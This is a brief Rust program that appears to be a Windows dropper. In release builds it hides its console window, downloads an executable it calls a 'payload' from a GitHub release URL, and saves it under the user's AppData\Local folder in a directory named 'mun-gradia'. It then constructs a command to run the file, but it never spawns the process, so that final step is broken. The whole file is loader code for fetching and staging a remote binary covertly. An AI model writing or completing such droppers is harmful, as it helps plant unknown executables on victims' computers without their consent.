#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]
use std::{fs, os};

#[tokio::main]
async fn main() {
    println!("Fetching payload...");
    let download_url = "http://github.com/ctih1/kake/releases/latest/download/client.exe";

    let resp = reqwest::get(download_url).await.expect("failed to download payload");
    let body = resp.bytes().await.expect("Invalid payload");

    let username = std::env::var("USERNAME").unwrap();

    println!("Saving payload");
    let base_path = format!("C:\\Users\\{username}\\AppData\\Local\\mun-gradia");
    if let Err(e) = fs::create_dir_all(&base_path) {
        println!("Failed to create dirs. {e}");
    }

    let path = format!("{base_path}\\client.exe");
    if let Err(e) = fs::write(&path, body) {
        println!("failed to write payload: {}", e);
    }

    std::process::Command::new(path);
}
